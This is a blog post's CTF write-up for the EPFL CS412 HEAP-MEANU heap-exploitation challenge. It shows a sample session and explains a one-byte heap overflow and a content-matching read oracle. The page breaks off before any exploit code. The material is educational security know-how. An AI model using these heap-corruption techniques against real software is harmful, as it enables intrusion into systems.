<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>EPFL CS412 CTF – HEAP-MEANU &#183; [root@rolbk.com]#</title><meta name=title content="EPFL CS412 CTF – HEAP-MEANU &#183; [root@rolbk.com]#"><meta name=description content="A writeup for EPFL CS412's HEAP-MEANU challenge involving heap exploitation through one-byte overflow and constrained brute-force reading. Despite full protections and modern libc 2.39, achieved RCE using a House of Spirits like attack."><meta name=keywords content="CTF,EPFL CS412,Writeup,PWN,Heap,House of Spirits,"><link rel=canonical href=https://rolbk.com/posts/412ctf-heap-meanu/><link type=text/css rel=stylesheet href=/css/main.bundle.min.db15651319416dc23c09716c6bfad333663de46f0b1634dd77228e3d4e350ca3fbb38193699e7e36ded41b245e010f69c5d8428ef1646be3b37248366e6ee201.css integrity="sha512-2xVlExlBbcI8CXFsa/rTM2Y95G8LFjTddyKOPU41DKP7s4GTaZ5+Nt7UGyReAQ9pxdhCjvFka+Ozckg2bm7iAQ=="><script type=text/javascript src=/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://rolbk.com/posts/412ctf-heap-meanu/"><meta property="og:site_name" content="[root@rolbk.com]#"><meta property="og:title" content="EPFL CS412 CTF – HEAP-MEANU"><meta property="og:description" content="A writeup for EPFL CS412’s HEAP-MEANU challenge involving heap exploitation through one-byte overflow and constrained brute-force reading. Despite full protections and modern libc 2.39, achieved RCE using a House of Spirits like attack."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-04-02T00:00:00+00:00"><meta property="article:modified_time" content="2025-04-02T00:00:00+00:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="EPFL CS412"><meta property="article:tag" content="Writeup"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Heap"><meta property="article:tag" content="House of Spirits"><meta property="og:image" content="https://rolbk.com/posts/412ctf-heap-meanu/featured.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://rolbk.com/posts/412ctf-heap-meanu/featured.png"><meta name=twitter:title content="EPFL CS412 CTF – HEAP-MEANU"><meta name=twitter:description content="A writeup for EPFL CS412’s HEAP-MEANU challenge involving heap exploitation through one-byte overflow and constrained brute-force reading. Despite full protections and modern libc 2.39, achieved RCE using a House of Spirits like attack."><meta name=twitter:image content="https://rolbk.com/posts/412ctf-heap-meanu/featured.png"><meta property="og:image" content="https://rolbk.com/posts/412ctf-heap-meanu/featured.png"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"EPFL CS412 CTF – HEAP-MEANU","headline":"EPFL CS412 CTF – HEAP-MEANU","abstract":"A writeup for EPFL CS412\u0026rsquo;s HEAP-MEANU challenge involving heap exploitation through one-byte overflow and constrained brute-force reading. Despite full protections and modern libc 2.39, achieved RCE using a House of Spirits like attack.","inLanguage":"en","url":"https:\/\/rolbk.com\/posts\/412ctf-heap-meanu\/","author":{"@type":"Person","name":"Emanuel Mairoll"},"copyrightYear":"2025","dateCreated":"2025-04-02T00:00:00\u002b00:00","datePublished":"2025-04-02T00:00:00\u002b00:00","dateModified":"2025-04-02T00:00:00\u002b00:00","keywords":["CTF","EPFL CS412","Writeup","PWN","Heap","House of Spirits"],"mainEntityOfPage":"true","wordCount":"2696"}]</script><meta name=author content="Emanuel Mairoll"><link href=https://github.com/rolbk/ rel=me><link href=https://www.linkedin.com/in/rolbk/ rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100"><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div><div class="relative max-w-[64rem] ml-auto mr-auto"><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">[root@rolbk.com]#</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Posts>Posts</p></a><a href=/projects/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="Under Construction ;-)">Projects</p></a><a href=/resume/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Resume>Resume</p></a><a href=https://github.com/rolbk target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><span><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Posts>Posts</p></a></li><li class=mt-1><a href=/projects/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="Under Construction ;-)">Projects</p></a></li><li class=mt-1><a href=/resume/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Resume>Resume</p></a></li><li class=mt-1><a href=https://github.com/rolbk target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><div><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></div><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div></div></div><script type=text/javascript src=/js/background-blur.min.0ad33cb9c066f652728b2cc09c9ceaf32645544f48e8b6b38f120d86f433ed997da275a49e6151fe0176430c45376812708d84727f3f969101fb44a4345b3f34.js integrity="sha512-CtM8ucBm9lJyiyzAnJzq8yZFVE9I6LazjxINhvQz7Zl9onWknmFR/gF2QwxFN2gScI2Ecn8/lpEB+0SkNFs/NA==" data-target-id=menu-blur></script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div id=hero class="h-[150px] md:h-[200px]"></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"><img id=background-image src=/posts/412ctf-heap-meanu/featured_hu_1014441d42b1251c.png alt="Background Image" class="absolute inset-0 w-full h-full object-cover"><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div><script type=text/javascript src=/js/background-blur.min.0ad33cb9c066f652728b2cc09c9ceaf32645544f48e8b6b38f120d86f433ed997da275a49e6151fe0176430c45376812708d84727f3f969101fb44a4345b3f34.js integrity="sha512-CtM8ucBm9lJyiyzAnJzq8yZFVE9I6LazjxINhvQz7Zl9onWknmFR/gF2QwxFN2gScI2Ecn8/lpEB+0SkNFs/NA==" data-target-id=background-blur data-image-id=background-image data-image-url=/posts/412ctf-heap-meanu/featured.png></script><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">EPFL CS412 CTF – HEAP-MEANU</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-04-02T00:00:00+00:00>2 April 2025</time><span class="px-2 text-primary-500">&#183;</span><span>2696 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">13 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] mr-2" href=/tags/ctf/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">CTF
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/epfl-cs412/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">EPFL CS412
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/writeup/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Writeup
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/pwn/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">PWN
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/heap/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Heap
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/house-of-spirits/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">House of Spirits</span></span></a></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8"><div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a><ul><li><a href=#primitives>Primitives</a></li></ul></li><li><a href=#a-bit-of-context>A bit of context</a><ul><li><a href=#heap-bins-tldr-fast-tcache-unsorted>Heap Bins TLDR (Fast, Tcache, Unsorted)</a></li><li><a href=#putting-things-together-literally>Putting Things Together (Literally)</a></li><li><a href=#pointer-concealing>Pointer concealing</a></li><li><a href=#something-with-houses-and-spirits>Something with Houses and Spirits</a></li><li><a href=#last-bit-of-trivia-thread-local-cache>Last Bit of Trivia: Thread Local Cache</a></li></ul></li><li><a href=#the-exploit>The Exploit</a><ul><li><a href=#quick-plan-of-action>Quick Plan of Action</a></li><li><a href=#step-by-step-walktrough>Step-by-step Walktrough</a></li></ul></li><li><a href=#final-thoughts>Final Thoughts</a></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a><ul><li><a href=#primitives>Primitives</a></li></ul></li><li><a href=#a-bit-of-context>A bit of context</a><ul><li><a href=#heap-bins-tldr-fast-tcache-unsorted>Heap Bins TLDR (Fast, Tcache, Unsorted)</a></li><li><a href=#putting-things-together-literally>Putting Things Together (Literally)</a></li><li><a href=#pointer-concealing>Pointer concealing</a></li><li><a href=#something-with-houses-and-spirits>Something with Houses and Spirits</a></li><li><a href=#last-bit-of-trivia-thread-local-cache>Last Bit of Trivia: Thread Local Cache</a></li></ul></li><li><a href=#the-exploit>The Exploit</a><ul><li><a href=#quick-plan-of-action>Quick Plan of Action</a></li><li><a href=#step-by-step-walktrough>Step-by-step Walktrough</a></li></ul></li><li><a href=#final-thoughts>Final Thoughts</a></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p>This write-up covers the HEAP-MEANU challenge from the CS412 introductionary PWNing CTF at EPFL. While most of the challenges in this course were quite straightforward - its an intro after all - this one actually <strong>was</strong> a challenge. It involved heap exploitation under very tight constraints: The binary had all standard protections enabled (Full RELRO, Canary, NX, and PIE), linked against a recent libc (2.39, meaning concealed pointers and no malloc hooks) and significantly limited heap operations. Despite these difficulties, it was fully exploitable, and I&rsquo;m pretty happy I managed to crack it.</p><h2 class="relative group">Challenge Overview<div id=challenge-overview class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#challenge-overview aria-label=Anchor>#</a></span></h2><p>The binary provides three basic heap operations through a simple text-based interface:</p><pre tabindex=0><code>❯ ./chal

██╗  ██╗███████╗ █████╗ ██████╗     ███╗   ███╗███████╗ █████╗ ███╗   ██╗██╗   ██╗
██║  ██║██╔════╝██╔══██╗██╔══██╗    ████╗ ████║██╔════╝██╔══██╗████╗  ██║██║   ██║
███████║█████╗  ███████║██████╔╝    ██╔████╔██║█████╗  ███████║██╔██╗ ██║██║   ██║
██╔══██║██╔══╝  ██╔══██║██╔═══╝     ██║╚██╔╝██║██╔══╝  ██╔══██║██║╚██╗██║██║   ██║
██║  ██║███████╗██║  ██║██║         ██║ ╚═╝ ██║███████╗██║  ██║██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝         ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝

HINT: -267552

1 - alloc
2 - edit
3 - delete
4 - exit
&gt; 1
size&gt; 12
content&gt; ABC

1 - alloc
2 - edit
3 - delete
4 - exit
&gt; 2
old content&gt; ABC
new content&gt; CBA

1 - alloc
2 - edit
3 - delete
4 - exit
&gt; 2
old content&gt; XYZ
ERROR: not found

1 - alloc
2 - edit
3 - delete
4 - exit
&gt; 3
content&gt; CBA

1 - alloc
2 - edit
3 - delete
4 - exit
&gt; 4
bye
</code></pre><p>You can:</p><ul><li><strong>Allocate</strong> memory blocks of constrained sizes (max 0x78 bytes, or 0x80 if you count the header).</li><li><strong>Edit</strong> existing blocks.</li><li><strong>Delete</strong> allocated blocks.</li></ul><p>Importantly, editing and deleting aren&rsquo;t done by index, but instead based on content matching. The program reads your input via <code>getline()</code> and matches it against existing chunks. Once matched, editing occurs using the <code>read()</code> system call, which notably allows passing null bytes. However, editing is limited to writing at most the current length of the string already stored in the heap chunk, making exploitation significantly harder.</p><h3 class="relative group">Primitives<div id=primitives class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#primitives aria-label=Anchor>#</a></span></h3><p>As mentioned above, the editing functionality allows writing at most <code>strlen(existring_string)</code> bytes into the buffer. However, there is a catch: if you fully fill up the (aligned) malloc block with non-zero bytes, the string length also includes the size byte of the header of the next block. This means we can write exactly one byte beyond our allocated block - a one-byte overflow.</p><p>For the second primitive, we do not have a plain read of heap blocks. But when using edit or delete, we&rsquo;re prompted to provide content that matches existing blocks. If a block matches, we&rsquo;re allowed further interaction. If not, we get 